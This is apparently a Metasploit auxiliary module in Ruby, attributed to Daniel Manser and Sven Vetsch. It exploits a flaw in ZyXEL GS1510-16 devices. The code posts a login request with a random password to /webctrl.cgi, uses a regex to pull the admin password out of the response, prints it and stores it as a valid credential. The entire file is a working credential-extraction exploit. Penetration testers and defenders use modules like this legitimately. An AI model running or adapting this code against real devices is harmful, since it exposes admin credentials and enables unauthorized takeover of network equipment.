##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'ZyXEL GS1510-16 Password Extractor',
      'Description' => %q{
          This module exploits a vulnerability in ZyXEL GS1510-16 routers
          to extract the admin password.
      },
      'References'  =>
        [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]
        ],
      'Author'      => [
        'Daniel Manser', # @antsygeek
        'Sven Vetsch' # @disenchant_ch
      ],
      'License'     => MSF_LICENSE
    )
  end

  def run
    begin
    print_status("Trying to get 'admin' user password ...")
    res = send_request_cgi({
      'uri'       => "/webctrl.cgi",
      'method'    => 'POST',
      'vars_post' => {
        'username' => "admin",
        'password' => "#{Rex::Text.rand_text_alphanumeric(rand(4)+4)}",
        'action' => "cgi_login"
      }
    }, 10)

    if (res && res.code == 200)
      print_status("Got response from router.")
    else
      print_error('Unexpected HTTP response code.')
      return
    end

    admin_password = ""
    admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/);

    if not admin_password_matches
      print_error('Could not obtain admin password')
      return
    else
      admin_password = admin_password_matches[1];
      print_good("Password for user 'admin' is: #{admin_password}")
      report_auth_info(
          :host   => rhost,
          :port   => rport,
          :sname  => "ZyXEL GS1510-16",
          :user   => 'admin',
          :pass   => admin_password,
          :active => true
      )
    end
  rescue ::Rex::ConnectionError
    print_error("#{rhost}:#{rport} - Failed to connect")
    return
  end
  end
end